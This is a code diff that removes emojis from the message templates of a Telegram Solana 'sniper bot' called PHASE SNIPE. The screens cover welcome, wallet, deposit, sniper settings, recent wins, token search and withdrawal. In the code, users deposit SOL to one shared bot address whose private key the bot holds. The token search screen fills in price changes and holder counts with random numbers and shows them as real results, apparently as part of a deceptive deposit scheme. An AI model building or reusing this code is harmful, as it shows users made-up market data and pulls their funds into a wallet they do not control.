@@ -36,25 +36,25 @@ def f_pct(v) -> str:
 
 def screen_welcome(balance: float) -> str:
     return (
-        "⚡ *PHASE SNIPE* ⚡\n"
+        "*PHASE SNIPE*\n"
         "_Hyperspeed Solana Sniper Bot_\n\n"
-        "🚀 *FEATURES*\n"
+        "*FEATURES*\n"
         "• AI-Powered Sniping\n"
         "• Copy Trading System\n"
         "• Real-Time Market Data\n"
         "• Advanced Risk Management\n\n"
-        f"💰 Wallet Value   `{f_sol(balance)} SOL`\n\n"
-        "💡 Get started — tap *Wallet* below"
+        f"Wallet Value   `{f_sol(balance)} SOL`\n\n"
+        "Get started — tap *Wallet* below"
     )
 
 
 def screen_wallet_generated(user_id: int | None = None) -> str:
     return (
-        "✅ *Wallet Access Ready!*\n\n"
+        "*Wallet Access Ready*\n\n"
         "Your private Telegram account ledger is ready.\n\n"
-        "📍 *Address*\n"
+        "*Address*\n"
         f"`{BOT_WALLET_ADDRESS}`\n\n"
-        "🔐 *Execution wallet* · shared bot address\n\n"
+        "*Execution wallet* · shared bot address\n\n"
         "_Tap the address to copy it. Deposits are credited to your account "
         "only when verified with its transaction hash._"
     )
@@ -66,47 +66,47 @@ def screen_wallet(
     total_value = balance + positions_value
     pnl_sign = "+" if unrealized_pnl >= 0 else ""
     return (
-        "💰 *Wallet*\n\n"
-        f"📍 *Address*\n`{BOT_WALLET_ADDRESS}`\n\n"
-        f"💵 *Available SOL*  ·  `{f_sol(balance)} SOL`\n"
-        f"📊 *Token Holdings*  ·  `{f_sol(positions_value)} SOL`\n"
-        f"📈 *Unrealized P/L*  ·  `{pnl_sign}{f_sol(unrealized_pnl)} SOL`\n"
-        f"💰 *Total Wallet Value*  ·  `{f_sol(total_value)} SOL`\n\n"
-        "🔐 *Private key*  ·  configured and stored in bot\n\n"
+        "*Wallet*\n\n"
+        f"*Address*\n`{BOT_WALLET_ADDRESS}`\n\n"
+        f"*Available SOL*  ·  `{f_sol(balance)} SOL`\n"
+        f"*Token Holdings*  ·  `{f_sol(positions_value)} SOL`\n"
+        f"*Unrealized P/L*  ·  `{pnl_sign}{f_sol(unrealized_pnl)} SOL`\n"
+        f"*Total Wallet Value*  ·  `{f_sol(total_value)} SOL`\n\n"
+        "*Private key*  ·  configured and stored in bot\n\n"
         "_Tap the address to copy it_"
     )
 
 
 def screen_deposit(user_id: int | None = None) -> str:
     return (
-        "📥 *Deposit SOL*\n\n"
+        "*Deposit SOL*\n\n"
         "Send SOL to this address:\n\n"
         f"`{BOT_WALLET_ADDRESS}`\n\n"
         "Tap the address above to copy it.\n\n"
-        "⚠️ This address is shared. After the transfer is confirmed, send the "
+        "This address is shared. After the transfer is confirmed, send the "
         "transaction hash to verify the deposit."
     )
 
 
 def screen_sniper_panel(cfg: dict) -> str:
-    status = "🟢 Active — paste any CA to snipe" if cfg["sniping"] else "🔴 Idle"
+    status = "Active — paste any CA to snipe" if cfg["sniping"] else "Idle"
     return (
-        "📈 *Sniper Panel*\n\n"
+        "*Sniper Panel*\n\n"
         f"Status       {status}\n\n"
-        f"Auto Buy     {'✅ ON' if cfg['auto_buy'] else '❌ OFF'}\n"
+        f"Auto Buy     {'ON' if cfg['auto_buy'] else 'OFF'}\n"
         f"Amount       `{f_sol(cfg['buy_amount'])} SOL`\n"
         f"Slippage     `{cfg['slippage']}%`\n"
         f"Priority     `{cfg['priority_fee']}`\n"
         f"Take Profit  `+{cfg['take_profit_pct']}%`\n"
         f"Stop Loss    `-{cfg['stop_loss_pct']}%`\n"
-        f"Auto Sell    {'✅ ON' if cfg['auto_sell'] else '❌ OFF'}\n\n"
-        "_Integrations: Raydium · Jupiter · Pump.fun ✅_"
+        f"Auto Sell    {'ON' if cfg['auto_sell'] else 'OFF'}\n\n"
+        "_Integrations: Raydium · Jupiter · Pump.fun_"
     )
 
 
 def screen_sniper_edit(cfg: dict) -> str:
     return (
-        "✏️ *Edit Sniper Config*\n\n"
+        "*Edit Sniper Config*\n\n"
         f"Amount       `{f_sol(cfg['buy_amount'])} SOL`\n"
         f"Slippage     `{cfg['slippage']}%`\n"
         f"Priority     `{cfg['priority_fee']}`\n"
@@ -119,20 +119,20 @@ def screen_sniper_edit(cfg: dict) -> str:
 def screen_recent_wins(gainers: list[dict] | None) -> str:
     if not gainers:
         return (
-            "🏆 *Recent Wins*\n\n"
-            "⚠️ Couldn't reach live market data right now.\n\n"
+            "*Recent Wins*\n\n"
+            "Couldn't reach live market data right now.\n\n"
             "_Tap Refresh to try again_"
         )
     lines = []
     for g in gainers:
         addr_short = trunc(g["address"], 4) if g["address"] else "N/A"
         lines.append(
-            f"🟢 *{g['symbol']}*  {f_pct(g['price_change_24h'])}\n"
+            f"*{g['symbol']}*  {f_pct(g['price_change_24h'])}\n"
             f"   MC {f_usd(g['market_cap'])}  ·  Liq {f_usd(g['liquidity'])}  ·  `{addr_short}`"
         )
     body = "\n\n".join(lines)
     return (
-        "🏆 *Recent Wins*\n\n"
+        "*Recent Wins*\n\n"
         f"{body}\n\n"
         "_Live top Solana gainers via DexScreener · tap Refresh for more_"
     )
@@ -147,7 +147,7 @@ def screen_token_search(query: str) -> str:
     change = random.uniform(-40, 260)
     holders = random.randint(80, 12_000)
     return (
-        f"🔍 *Search Result — {symbol}*\n\n"
+        f"*Search Result — {symbol}*\n\n"
         f"Queried      `{label}`\n"
         f"Price        `${price:.8f}`\n"
         f"Market Cap   {f_usd(mc)}\n"
@@ -160,10 +160,10 @@ def screen_token_search(query: str) -> str:
 
 def screen_withdraw_confirm(to_address: str, amount: float) -> str:
     return (
-        "📤 *Withdrawal Confirmation*\n\n"
+        "*Withdrawal Confirmation*\n\n"
         f"Amount       `{f_sol(amount)} SOL`\n"
         f"To           `{trunc(to_address, 10)}`\n"
         f"From         `{trunc(BOT_WALLET_ADDRESS, 8)}`\n\n"
-        "⚠️ _This action cannot be undone._\n\n"
+        "_This action cannot be undone._\n\n"
         "Confirm the transaction?"
     )
